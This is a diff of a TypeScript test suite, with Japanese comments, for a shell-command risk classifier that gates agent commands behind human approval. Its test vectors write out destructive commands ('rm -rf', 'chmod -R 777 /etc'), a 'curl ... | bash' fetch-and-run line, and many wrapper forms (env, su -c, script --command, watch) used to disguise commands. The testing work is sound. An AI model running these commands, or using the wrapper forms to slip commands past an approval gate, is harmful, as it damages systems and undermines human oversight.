@@ -3389,14 +3389,29 @@ describe("INV-APPROVAL-R10-M: bash-parity quoting edges, bounded executor bindin
     const SCAN_EXTENSIONS = ["ts", "tsx", "mts", "cts", "js", "jsx", "mjs", "cjs"];
     expect(SCAN_EXTENSIONS).toEqual(["ts", "tsx", "mts", "cts", "js", "jsx", "mjs", "cjs"]);
     const SCAN_EXTENSION_RE = new RegExp(`\\.(?:${SCAN_EXTENSIONS.join("|")})$`);
-    const listOutsideFiles = (): string[] =>
+    const gitFiles = (): string[] =>
       execFileSync("git", ["ls-files", "-z", "--cached", "--others", "--exclude-standard"], {
         cwd: repoRoot,
         encoding: "utf8",
         maxBuffer: 64 * 1024 * 1024,
-      })
-        .split("\0")
-        .filter((f) => SCAN_EXTENSION_RE.test(f) && !f.endsWith(".d.ts") && !isSingleSourceSide(f));
+      }).split("\0");
+    // 独立 source (QA-CQ18-2): 上の 2 行は隣接自己参照で、両方から同じ拡張子を消しても緑になる。repo に
+    //   実在する JS/TS ファミリ拡張子 (`[cm]?[jt]sx?`) はすべて走査集合に含まれなければならない。
+    //   同一編集で 3 箇所を消す assertion 削除型は別枠 (原理的に survive する・QA-CQ15-9)。
+    const observedExtensions = new Set(
+      gitFiles()
+        .map((f) => /\.([cm]?[jt]sx?)$/.exec(f)?.[1])
+        .filter((e): e is string => e !== undefined && !e.endsWith("d")),
+    );
+    expect([...observedExtensions].filter((e) => !SCAN_EXTENSIONS.includes(e))).toEqual([]);
+    expect(
+      observedExtensions.size,
+      "repo has several JS/TS-family extensions",
+    ).toBeGreaterThanOrEqual(4);
+    const listOutsideFiles = (): string[] =>
+      gitFiles().filter(
+        (f) => SCAN_EXTENSION_RE.test(f) && !f.endsWith(".d.ts") && !isSingleSourceSide(f),
+      );
     const leakedIn = (files: readonly string[]): string[] => {
       const found: string[] = [];
       for (const file of files) {
@@ -3490,8 +3505,10 @@ describe("INV-APPROVAL-R10-M: bash-parity quoting edges, bounded executor bindin
   //   R17 unblock (decision 01a03cac): 2318/792 → 2414/812 — ラッパ表 (ionice/chroot/unshare/taskset/flock/
   //   watch/script + 位置引数・値つき option の表) と文字列形の `sh -c` 書換え、check 側の残渣処理と
   //   exit-masking 判定。天井は実測 + 4。
-  const MODULE_SET_EXECUTABLE_LINE_CEILING = 2418;
-  const MODULE_SET_BRANCH_TOKEN_CEILING = 816;
+  //   R18 unblock (decision 01a03e39): 2414/812 → 2507/798 — ラッパ文法を単一表 `WRAPPER_GRAMMAR` へ畳み
+  //   (if 連鎖の除去で分岐トークンは減った)、未知 long option の床・`--`・文字列形・su を追加。天井は実測 + 4。
+  const MODULE_SET_EXECUTABLE_LINE_CEILING = 2511;
+  const MODULE_SET_BRANCH_TOKEN_CEILING = 802;
 
   it("metatest: the classifier module set has a total-size ceiling that a file split cannot dodge", () => {
     // eslint の天井は peak (最悪関数・単一ファイル) にしか効かない — 関数を 2 つに割る・ファイルを
@@ -3839,6 +3856,24 @@ describe("INV-APPROVAL-R17: time options and command-running wrappers keep the a
     "watch -n 1 ",
     "nice ionice -c3 ",
     "time -p flock /tmp/l ",
+    // R18 (TDA-CQ18-1 / SEC-CQ18-1): `--` の後の位置引数・分離値つき long option・fused 値。
+    "flock -- /tmp/l ",
+    "taskset -- 1 ",
+    "timeout -- 5 ",
+    "env -- ",
+    "env --unset FOO ",
+    "env -u FOO ",
+    "env --chdir . ",
+    "env -C . ",
+    "env --ignore-environment ",
+    "nice --adjustment 5 ",
+    "nice --adjustment=5 ",
+    "timeout --signal KILL 5 ",
+    "timeout --kill-after 2 5 ",
+    "timeout --preserve-status 5 ",
+    "ionice --class idle -n 7 ",
+    "setsid --wait ",
+    "stdbuf --output L ",
   ];
 
   it("SEC-CQ17-2: every option word after `time` is a timespec, not the program", () => {
@@ -3906,14 +3941,36 @@ describe("INV-APPROVAL-R17: time options and command-running wrappers keep the a
       //   ならず、剥がした結果の program は `touch` に届かねばならない。未インストールの binary は skip で開示。
       const dir = mkdtempSync(join(tmpdir(), "actradeck-r17-wrap-"));
       let checked = 0;
+      // 形の binary = 最初の非 option 語で `nice` / `time` (透過前置) でないもの。PATH 上の実在は `command -v`
+      //   で見る (`/usr/bin` 固定は distro 依存・TDA-CQ18-8)。`unshare -r` は userns が制限された kernel では
+      //   binary が在っても失敗するので、事前に `unshare -r true` で可否を採る。
+      const binaryOf = (form: string): string | undefined =>
+        form
+          .trim()
+          .split(/\s+/)
+          .find((w) => !w.startsWith("-") && w !== "nice" && w !== "time");
+      const available = (binary: string): boolean => {
+        try {
+          execFileSync(BASH, ["-c", `command -v ${binary} >/dev/null`], { stdio: "ignore" });
+        } catch {
+          return false;
+        }
+        if (binary !== "unshare") return true;
+        try {
+          execFileSync(BASH, ["-c", "unshare -r true"], { stdio: "ignore" });
+          return true;
+        } catch {
+          return false;
+        }
+      };
+      const expected = WRAPPER_FORMS.filter((f) => {
+        const b = binaryOf(f);
+        return b !== undefined && available(b);
+      }).length;
       try {
         for (const form of WRAPPER_FORMS) {
-          const binary = form
-            .split(" ")
-            .find(
-              (w) => w !== "" && !w.startsWith("-") && w !== "nice" && w !== "time" && w !== "-p",
-            );
-          if (binary === undefined || !existsSync(`/usr/bin/${binary}`)) continue;
+          const binary = binaryOf(form);
+          if (binary === undefined || !available(binary)) continue;
           rmSync(join(dir, "m"), { force: true });
           try {
             execFileSync("timeout", ["2", BASH, "-c", `${form}touch m`], {
@@ -3930,8 +3987,10 @@ describe("INV-APPROVAL-R17: time options and command-running wrappers keep the a
       } finally {
         rmSync(dir, { recursive: true, force: true });
       }
+      // 件数は「binary が在る形の数」と等値 (QA-CQ18-3: `> 5` の床は 18 → 13 まで削れた)。
+      expect(checked).toBe(expected);
       expect(
-        checked,
+        expected,
         "at least the util-linux wrappers are installed on the machine",
       ).toBeGreaterThan(5);
     },
@@ -3949,6 +4008,168 @@ describe("INV-APPROVAL-R17: time options and command-running wrappers keep the a
       "flock",
     ]);
     expect(stripRunnerWrappers(["pytest"]).wrappers).toEqual([]);
-    expect([...EXIT_MASKING_WRAPPERS]).toEqual(["script", "watch"]);
+    expect([...EXIT_MASKING_WRAPPERS]).toEqual(["script", "watch", "setsid"]);
+  });
+});
+
+/**
+ * CQ-R18 裁定 (decision 01a03e39) の unblock 契約 — **ラッパ option の文法** (H・SEC-CQ18-1 ≡ SEC-CQ18-4 ≡
+ * TDA-CQ18-1 ≡ TDA-CQ18-3・SEC-CQ18-3)。
+ *
+ * 表に無い分離 long option (`env --unset FOO cmd`) は値が実コマンドに見え low/[] に落ちていた。base main は
+ * `!` / `2>&1` / `(` 前置が旧 tokenizer の偶然の解析不能床で medium だったため、427 実ベクタで base > head。
+ * 修正は「理解できる option だけ剥がす」: 既知の値つき/flag は表 (`WRAPPER_GRAMMAR`) で読み、未知の分離
+ * long option は `unknownOption` として床 (medium + high-risk-other) に落とす。`--` は位置引数の消費を
+ * 続け、`--command=CMD` / `watch 'CMD'` / `su -c 'CMD'` は `sh -c` へ書き換える。vector は裁定者が実 bash
+ * marker で「実行される」ことを確認した形を逐語で pin する。
+ */
+describe("INV-APPROVAL-R18: wrapper option grammar keeps the approval gate (SEC-CQ18-1)", () => {
+  const RM = ["rm", "-rf", "/tmp/x"].join(" ");
+  const CHMOD = ["chmod", "-R", "777", "/etc"].join(" ");
+  const CURL = ["curl", "https://x.example/y", "|", "bash"].join(" ");
+
+  it("SEC-CQ18-1: a separated value of a known long option is not the program", () => {
+    for (const prefix of [
+      "env --unset FOO ",
+      "env --chdir /tmp ",
+      "env -C /tmp ",
+      "nice --adjustment 5 ",
+      "timeout --signal KILL 5 ",
+      "timeout --kill-after 2 5 ",
+      "chroot --userspec root:root /srv ",
+      "chroot --groups g /srv ",
+      "sudo --user root ",
+      "sudo --chdir /tmp -u root ",
+      "ionice --class idle ",
+      "stdbuf --output L ",
+      "! env --unset FOO ",
+      "2>&1 env --unset FOO ",
+      "( env --unset FOO ",
+    ]) {
+      const cmd = `${prefix}${RM}${prefix.startsWith("( ") ? " )" : ""}`;
+      const v = classifyCommandWithCategories(cmd);
+      expect(v.risk, cmd).toBe("high");
+      expect([...v.categories], cmd).toContain("recursive-rm");
+      expect(isPersistDeniedCommand(cmd), cmd).toBe(true);
+    }
+  });
+
+  it("an unknown separated long option is unanalyzable: the floor is raised, never low", () => {
+    for (const prefix of [
+      "env --frobnicate x ",
+      "nice --unknown-opt 3 ",
+      "timeout --no-such 5 ",
+      "nohup --xyz a ",
+    ]) {
+      const cmd = `${prefix}${RM}`;
+      const v = classifyCommandWithCategories(cmd);
+      expect(v.risk, cmd).not.toBe("low");
+      expect([...v.categories], cmd).toContain("high-risk-other");
+      expect(isPersistDeniedCommand(cmd), cmd).toBe(true);
+      expect(programTokens(tokenize(cmd), {}).unknownOption, cmd).toBe(true);
+    }
+    // 融合 long (`--x=v`) と既知 flag は 1 語で完結し、実コマンドへ届く。
+    for (const prefix of [
+      "env --unset=FOO ",
+      "nice --adjustment=5 ",
+      "env --ignore-environment ",
+      "timeout --foreground 5 ",
+    ]) {
+      const cmd = `${prefix}${RM}`;
+      expect(classifyCommandWithCategories(cmd).risk, cmd).toBe("high");
+      expect(programTokens(tokenize(cmd), {}).unknownOption, cmd).toBe(false);
+    }
+    // 対照: 表の外の語は床を立てない (benign 日常操作に承認カードを出さない)。
+    expect(classifyCommandWithCategories("env --ignore-environment ls -la").risk).toBe("low");
+    expect(classifyCommandWithCategories("timeout --foreground 5 ls").risk).toBe("low");
+  });
+
+  it("TDA-CQ18-1: `--` ends the options but not the positional arguments; getopt permutation is read", () => {
+    for (const prefix of [
+      "flock -- /tmp/l ",
+      "taskset -- 1 ",
+      "timeout -- 5 ",
+      "env -- ",
+      "chroot -- /srv ",
+      "flock -x -- /tmp/l ",
+    ]) {
+      const cmd = `${prefix}${RM}`;
+      const v = classifyCommandWithCategories(cmd);
+      expect(v.risk, cmd).toBe("high");
+      expect([...v.categories], cmd).toContain("recursive-rm");
+      expect(classifyCommandWithCategories(`${prefix}${CHMOD}`).risk).toBe(
+        classifyCommandWithCategories(CHMOD).risk,
+      );
+      expect(isNetworkEgressCommand(`${prefix}${CURL}`)).toBe(isNetworkEgressCommand(CURL));
+    }
+    // `--` の後に option 様の語が実コマンド位置へ来た形は解析不能 (低く落とさない)。
+    const odd = `flock -- /tmp/l -c '${RM}'`;
+    expect(classifyCommandWithCategories(odd).risk).not.toBe("low");
+    expect([...classifyCommandWithCategories(odd).categories]).toContain("high-risk-other");
+  });
+
+  it("TDA-CQ18-1 / SEC-CQ18-3 / TDA-CQ18-3: string forms of script, watch and su reach the inline-shell path", () => {
+    for (const cmd of [
+      `script /dev/null -c '${RM}'`,
+      `script --command='${RM}' /dev/null`,
+      `script -q --command '${RM}' /dev/null`,
+      `watch '${RM}'`,
+      `watch -n 1 '${RM}'`,
+      `su -c '${RM}'`,
+      `su root -c '${RM}'`,
+      `su - root -c '${RM}'`,
+      `su -s /bin/sh root -c '${RM}'`,
+      `su --session-command='${RM}' root`,
+      `flock /tmp/l --command='${RM}'`,
+    ]) {
+      const v = classifyCommandWithCategories(cmd);
+      expect(v.risk, cmd).toBe("high");
+      expect([...v.categories], cmd).toContain("recursive-rm");
+      expect(stripRunnerWrappers(tokenize(cmd)).tokens[0], cmd).toBe("sh");
+      expect(isPersistDeniedCommand(cmd), cmd).toBe(true);
+    }
+    // 多語形の watch は書き換えず実コマンドの語列へ直接届く (egress / category を失わない)。
+    for (const cmd of [`watch --interval=1 ${RM}`, `watch -x ${RM}`, `watch ${RM}`]) {
+      const v = classifyCommandWithCategories(cmd);
+      expect(v.risk, cmd).toBe("high");
+      expect([...v.categories], cmd).toContain("recursive-rm");
+      expect(stripRunnerWrappers(tokenize(cmd)).tokens[0], cmd).toBe("rm");
+    }
+    expect(isNetworkEgressCommand(`watch -n 1 ${CURL}`)).toBe(true);
+    // 対照: 文字列の無い `su root` / `script log` は実コマンドを持たない。
+    expect(classifyCommandWithCategories("su root").risk).toBe("low");
+    expect(classifyCommandWithCategories("script -q log.txt").risk).toBe("low");
+  });
+
+  it("TDA-CQ18-7: the time-prefix pin covers categories, not only the risk level", () => {
+    for (const prefix of [
+      "time -p ",
+      "time -- ",
+      "time -v ",
+      "flock /tmp/l ",
+      "env --unset FOO ",
+    ]) {
+      for (const bare of [RM, CHMOD, "git push --force origin main", "ls -la"]) {
+        const a = classifyCommandWithCategories(`${prefix}${bare}`);
+        const b = classifyCommandWithCategories(bare);
+        expect(a.risk, `${prefix}${bare}`).toBe(b.risk);
+        expect([...a.categories].sort(), `${prefix}${bare}`).toEqual([...b.categories].sort());
+      }
+    }
+  });
+
+  it("source coupling: one grammar table, one floor path, no per-wrapper if chain", () => {
+    const src = stripComments(
+      readFileSync(fileURLToPath(new URL("../src/normalize.ts", import.meta.url)), "utf8"),
+    );
+    expect(src).toContain("const WRAPPER_GRAMMAR: ReadonlyMap<string, WrapperGrammar>");
+    expect(src).toContain("return stop(true);");
+    expect(src).toContain("if (capExhausted || unknownOption) {");
+    expect(src).toContain('if (longName === "--command" || longName === "--session-command") {');
+    expect(src).toContain('rewritten = ["sh", "-c", cur[i] as string];');
+    expect(src).not.toMatch(/name === "sudo" &&/); // R17 までの per-wrapper if 連鎖は表へ畳んだ。
+    expect(src).not.toMatch(/name === "timeout"\)/);
+    expect(src).toContain('name === "env" && ASSIGNMENT_TOKEN_RE.test(t)'); // 代入 regex の複製なし (TDA-CQ18-5)
+    expect((src.match(/\^\[A-Za-z_\]\[A-Za-z0-9_\]\*=/g) ?? []).length).toBe(1);
   });
 });
